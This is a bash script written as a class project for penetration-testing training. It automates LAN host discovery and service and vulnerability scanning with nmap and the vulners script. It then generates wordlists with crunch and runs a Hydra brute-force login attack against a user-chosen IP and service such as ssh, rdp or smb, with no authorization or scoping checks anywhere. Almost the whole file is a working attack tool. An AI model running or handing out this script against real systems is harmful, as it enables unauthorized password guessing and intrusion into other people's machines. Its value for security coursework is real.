#!/bin/bash

#~ Name: Warren Justin Chan
#~ Code: S5
#~ Class: CFC3110
#~ Trainer: Kar Wei

#~ Goal of this script is to map all devices on the network, identify services, and potential vulnerabilities
#~ Performs a Hydra Brute Force attack on selected service and then generates a report based on attack

figlet -c WARREN\'S PROJECT VULNER

	echo

#~ This script is broken up into sections.
#~ Sections are put into functions for reusability.

function MENUFUNCTION()
{

#~ tee - read from standard input and write to standard output and files
#~ /dev/null removes output of command into CLI 

(echo "$(date) : Script started" ; echo) | tee -a PTEnumReport > /dev/null

echo "Welcome. How would you like to start?
1. Start Vulnerability Scanner (Nmap) + Brute Force Attack (Hydra)
2. View Reports
3. Exit"

read mainmenu

case $mainmenu in 

	1)
	
function VULNSCANATTACK()
{
	echo

echo "Your IP is:"; ifconfig | head -n 2 | tail -n 1 | awk '{print $2}'

echo "Your Subnet Mask is:"; ifconfig | head -n 2 | tail -n 1 | awk '{print $4}'

echo "Your Broadcast Address is:"; ifconfig | head -n 2 | tail -n 1 | awk '{print $6}'

	echo

echo "Enter the first IP Address within your network:"

read cidrfirstip

	echo

echo "Enter the last IP Address within your network:"

read cidrlastip

	echo

echo "Calculating CIDR Block.."

#~ Commands are put into a variable and then 'tee'-ed into the report. 
#~ By giving netmask the first and last ip address of the users network, the -c flag can calculate the LAN Range

lanrange=$(netmask -c $cidrfirstip:$cidrlastip)


echo "Your LAN Range is: $lanrange" | tee -a PTEnumReport

	echo

#~ -sn flag to print out the available hosts and skip port scan
#~ To get a cleaner output, grep for ip address only
#~ Uniq prevents the output of duplicate addresses

nmap -sn $lanrange | grep -Eo '([0-9]{1,3}[\.]){3}[0-9]{1,3}' | uniq > PTiplist.lst

ip_list=$(cat PTiplist.lst)

echo "Found IP addresses are:
$ip_list" | tee -a PTEnumReport

	echo

echo "Looking for open ports on each live host:"

#~ -sV to probe open ports to determine service/version info
#~ -iL to read command from a list


nmap_sv=$(nmap -sV -iL PTiplist.lst)

	echo

echo "$nmap_sv" | tee -a PTEnumReport

	echo

echo "Results saved to: PTEnumReport"

	echo

echo "Enter IP Address to scan for vulnerabilities: "

read ipvulnscan

	echo

echo "Enter Port Number:"

read portvulnscan

	echo

#~ vulners.nse script outputs known vulnerabilities (links to the correspondent info) and correspondent CVSS scores.
#~ The result of the vulners.nse scan is saved to target IP address file for reference

nmap_vulners=$(nmap --script vulners.nse -sV $ipvulnscan -p $portvulnscan)

echo "$nmap_vulners" | tee -a $ipvulnscan

	echo

echo "Results saved to file: $ipvulnscan"

	echo

# Use crunch to create list of usernames and password list. 


echo "Attempting to brute force selected IP and Port..."

	echo

echo "Would you like to: 
A) Use an existing Username and Password list
B) Create a new Username and Password list"

read unpwlist

if [ $unpwlist == A ] || [ $unpwlist == a ]
then

echo "Enter Username File:"

read unlist

	echo

echo "Using username file: $unlist" | tee -a $ipvulnscan

	echo

echo "Enter Password File:"

read pwlist

	echo

echo "Using password file: $pwlist" | tee -a $ipvulnscan

	echo
	
# Let users choose which service they would like to hydra then brute force it.

echo "Currently supported brute force services: 
adam6500  afp asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get|post}
http[s]-{get|post}-form  http-proxy  http-proxy-urlenum  icq   imap[s]   irc   ldap2[s]
ldap3[-{cram|digest}md5][s] mssql mysql(v4) mysql5 ncp nntp oracle oracle-listener ora‐
cle-sid pcanywhere pcnfs pop3[s] postgres rdp radmin2 redis rexec rlogin rpcap rsh rtsp
s7-300  sapr3  sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s]
vmauthd vnc xmpp"

	echo

echo "Enter login service to brute force:" 

read loginservice

	echo

echo "Selected login service is: $loginservice" | tee -a $ipvulnscan

	echo
	
# -t flag to control timing.
# -I ignores previous scan
# grep for 'host' because we're only looking for successful results.

hydra -L $unlist -P $pwlist $ipvulnscan $loginservice -vV -I -t 10 | grep host | tee -a $ipvulnscan

	echo

#~ Filenames are of the targeted IP addresses. This is done to facilitate the search for reports. (Will see later in the script)

echo "Results saved to file: $ipvulnscan" 

	echo

#~ Once the brute force command has been executed, users are then given an option if they would like to run the scan and attack again or view a report previous scan

echo "Would you like to:
1. Run Vulnerability Scanner + Brute Force Attack again
2. Return to Main Menu
3. Exit"

read returnmainmenu1

case $returnmainmenu1 in

1)

#~ Functions used as a command instead of having to write the entire script again as a case option
	VULNSCANATTACK
	
	;;

2)

	MENUFUNCTION
	
	;;
	
3)

	echo "Thank you and have a nice day!"
	
	exit
	
	;;


*)

#~ Any other input besides the ones listed above will return an 'input not recognized' and immediately exit the script

	echo "Input not recognized.. Exiting"
	
	exit
	
	;;
	
esac

# Use crunch to create list of usernames and password list. 

elif [ $unpwlist == B ] || [ $unpwlist == b ]
then

echo "Creating Username List.." | tee -a $ipvulnscan

echo

echo "Enter minimum number of characters:"

read crunchmin

echo

echo "Enter maximum number of characters:"

read crunchmax

echo

echo "Do you want to specify A) Patterns or B) Symbols/Characters"

read usrcrunchpattern

	if [ $usrcrunchpattern == A ] || [ $usrcrunchpattern == a ]
	then
echo "Pattern list: 
@ = lower case characters
, = upper case characters
% = numbers
^ = symbols
Enter Pattern:"
	read crunchpatternyes
	
#~ Crunch allows users to create their own wordlists, the names of the files that crunch is saved to does not change, only the content
	
	crunch $crunchmin $crunchmax -t $crunchpatternyes -o PTusernames.txt
	
	echo
	
	echo "Username List saved to PTusernames.txt" | tee -a $ipvulnscan
	
	elif [ $usrcrunchpattern == B ] || [ $usrcrunchpattern == b ]
	then
	
	echo "Enter characters/symbols to use:"
	read crunchcharacters
	
	crunch $crunchmin $crunchmax $crunchcharacters -o PTusernames.txt
	
	echo
	
	echo "Username List saved to PTusernames.txt" | tee -a $ipvulnscan
	
	echo
	
	else
	
	echo "Input not recognized.. Exiting"
	
	fi
	
echo

echo "Creating Password List.."

echo

echo "Enter minimum number of characters:"

read pwcrunchmin

echo "Enter maximum number of characters:"

read pwcrunchmax

echo

echo "Do you want to specify A) Patterns or B) Symbols/Characters"

read pwcrunchpattern

echo

	if [ $pwcrunchpattern == A ] || [ $pwcrunchpattern == a ]
	then
echo "Pattern list: 
@ = lower case characters
, = upper case characters
% = numbers
^ = symbols
Enter Pattern:"
read pwcrunchpatternyes
	
	crunch $pwcrunchmin $pwcrunchmax -t $pwcrunchpatternyes -o PTpasswords.txt
	
	echo
	
	echo "Password List saved to PTpasswords.txt" | tee -a $ipvulnscan
	
	elif [ $pwcrunchpattern == B ] || [ $pwcrunchpattern == b ]
	then
	
	echo "Enter characters/symbols to use:"
	read pwcrunchcharacters
	
	echo
	
	crunch $pwcrunchmin $pwcrunchmax $pwcrunchcharacters -o PTpasswords.txt
	
	echo "Password List saved to PTpasswords.txt" | tee -a $ipvulnscan
	
	else
	
	echo "Input not recognized.. Exiting."
	
	exit
	
	fi
	
	echo

echo "Currently supported brute force services: 
adam6500  afp asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get|post}
http[s]-{get|post}-form  http-proxy  http-proxy-urlenum  icq   imap[s]   irc   ldap2[s]
ldap3[-{cram|digest}md5][s] mssql mysql(v4) mysql5 ncp nntp oracle oracle-listener ora‐
cle-sid pcanywhere pcnfs pop3[s] postgres rdp radmin2 redis rexec rlogin rpcap rsh rtsp
s7-300  sapr3  sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s]
vmauthd vnc xmpp"

echo

echo "Enter login service to brute force:"

read loginservice

echo "Selected login service is: $loginservice" | tee -a $ipvulnscan

	echo

hydra -L PTusernames.txt -P PTpasswords.txt $ipvulnscan $loginservice -vV -I -t 10 | grep host | tee -a $ipvulnscan
	
	echo
	
echo "Results saved to file: $ipvulnscan"

	echo

echo "Would you like to:
1. Run Vulnerability Scanner + Brute Force Attack again
2. Return to Main Menu
3. Exit"

read returnmainmenu2

case $returnmainmenu2 in

1)

	VULNSCANATTACK
	
	;;

2)

	MENUFUNCTION
	
	;;
	
3)

	echo "Thank you and have a nice day!"
	
	exit
	
	;;
	
*)

	echo "Input not recognized.. Exiting"
	
	exit
	
	;;
	
	esac
	

	else
	
	echo "Input not recognized.. Exiting"
	
	fi


}


VULNSCANATTACK

;;

	2)

function REPORTVIEWER()
{

echo "Select a report to view:
(NOTE: If this script is being run for the first time, there won't be any reports to be viewed.)
1. Enumerated LAN Network Report
2. Vulnerability Scan + Brute Force Report"

read reportmenu

case $reportmenu in 

1)

#~ Simple cat of previously saved report would generate previously searched information
 
		cat PTEnumReport
		
		echo
		
echo "Would you like to:
1. Return to Previous Menu
2. Return to Main Menu
3. Exit"

read returnmainmenu3

	case $returnmainmenu3 in
	1)
	
		REPORTVIEWER
		
		;;
	
	2)
	
		MENUFUNCTION
		
		;;
		
	3)
	
		echo "Thank you and have a nice day!"
		
		exit
		
		;;
		
	*)
	
		echo "Input not recognized.. Exiting"
		
		exit
		
		;;
		
	esac
;;

2)

#~ This allows the user to enter an IP address and display all previous attempts and searches

		echo "Enter IP Address:"
		read ipreport
		
		cat $ipreport
		
		echo
		
echo "Would you like to:
1. Return to Previous Menu
2. Return to Main Menu
3. Exit"

read returnmainmenu4

	case $returnmainmenu4 in
	1)
	
		REPORTVIEWER
		
		;;
	
	2)
	
		MENUFUNCTION
		
		;;
		
	3)
	
		echo "Thank you and have a nice day!"
		
		exit
		
		;;
		
	*)
	
		echo "Input not recognized.. Exiting"
		
		exit
		
		;;
		
	esac

;;

esac

}


REPORTVIEWER

;;

*) 

	echo "Input not recognized.. Exiting"
	
	exit
	
;;
	
esac



}

MENUFUNCTION

#~ RREFERENCES

#~ nmap IP only
#~ https://www.redhat.com/sysadmin/quick-nmap-inventory

#~ || command in if statements
#~ https://unix.stackexchange.com/questions/47584/in-a-bash-script-using-the-conditional-or-in-an-if-statement

#~ *) option in case commands
#~ https://phoenixnap.com/kb/bash-case-statement


